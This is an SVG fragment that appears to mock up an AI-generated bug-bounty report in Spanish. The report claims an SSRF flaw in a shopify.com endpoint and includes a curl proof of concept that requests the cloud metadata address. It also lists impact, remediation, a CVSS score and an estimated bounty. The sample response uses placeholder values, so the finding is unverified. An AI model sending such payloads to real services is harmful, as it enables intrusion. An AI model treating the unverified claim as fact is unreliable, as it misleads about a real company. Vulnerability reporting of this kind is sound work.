  <line x1="440" y1="222" x2="1156" y2="222" stroke="rgba(255,255,255,0.06)" stroke-width="1"/>

  <!-- AI Generated content marker -->
  <rect x="440" y="235" width="200" height="22" rx="4" fill="rgba(0,255,65,0.05)" stroke="rgba(0,255,65,0.1)" stroke-width="1"/>
  <text x="452" y="250" fill="#00ff41" font-size="9">🤖 Generado por IA · qwen3:14b</text>

  <!-- Report Content -->
  <text x="440" y="285" fill="#e0f0e0" font-size="12" font-weight="bold">Resumen</text>
  <text x="440" y="305" fill="rgba(255,255,255,0.6)" font-size="10" line-height="1.5">Se identificó una vulnerabilidad de Server-Side Request Forgery (SSRF) en el endpoint /api/forward de shopify.com. El parámetro url no valida correctamente el destino, permitiendo al atacante forzar al servidor a realizar peticiones a recursos internos.</text>

  <text x="440" y="345" fill="#e0f0e0" font-size="12" font-weight="bold">Impacto</text>
  <text x="440" y="365" fill="rgba(255,255,255,0.6)" font-size="10">• Acceso a metadatos internos (AWS / GCP)</text>
  <text x="440" y="383" fill="rgba(255,255,255,0.6)" font-size="10">• Escaneo de puertos internos</text>
  <text x="440" y="401" fill="rgba(255,255,255,0.6)" font-size="10">• Lectura de archivos internos del servidor</text>

  <text x="440" y="430" fill="#e0f0e0" font-size="12" font-weight="bold">PoC (Proof of Concept)</text>

  <!-- Code block -->
  <rect x="440" y="444" width="720" height="130" rx="6" fill="rgba(0,0,0,0.4)" stroke="rgba(0,255,65,0.08)" stroke-width="1"/>
  <text x="452" y="462" fill="#00ff41" font-size="9" font-family="monospace"># PoC: Server-Side Request Forgery</text>
  <text x="452" y="478" fill="#ffab00" font-size="9" font-family="monospace">$ curl -X POST https://shopify.com/api/forward \</text>
  <text x="452" y="494" fill="#ffab00" font-size="9" font-family="monospace">  -H "Content-Type: application/json" \</text>
  <text x="452" y="510" fill="#ffab00" font-size="9" font-family="monospace">  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'</text>
  <text x="452" y="534" fill="#00e676" font-size="9" font-family="monospace"># Respuesta: 200 OK — metadatos AWS obtenidos</text>
  <text x="452" y="550" fill="rgba(255,255,255,0.3)" font-size="9" font-family="monospace"># { "ami-id": "ami-12345678", "instance-type": "t3.medium", ... }</text>

  <text x="440" y="595" fill="#e0f0e0" font-size="12" font-weight="bold">Remediación</text>
  <text x="440" y="615" fill="rgba(255,255,255,0.6)" font-size="10">• Validar el parámetro url contra una lista blanca de dominios permitidos</text>
  <text x="440" y="633" fill="rgba(255,255,255,0.6)" font-size="10">• Bloquear direcciones IP privadas y de metadatos cloud</text>
  <text x="440" y="651" fill="rgba(255,255,255,0.6)" font-size="10">• Usar una lista de bloqueo de rangos IP internos</text>

  <!-- Severity and CVSS -->
  <rect x="440" y="670" width="120" height="28" rx="6" fill="rgba(255,102,0,0.15)"/>
  <text x="445" y="682" fill="#ff6600" font-size="9" font-weight="bold">ALTO · CVSS 7.5</text>
  <rect x="575" y="670" width="100" height="28" rx="6" fill="rgba(0,255,65,0.1)"/>
  <text x="580" y="682" fill="#00ff41" font-size="9" font-weight="bold">💰 $3,500 estimado</text>
</svg>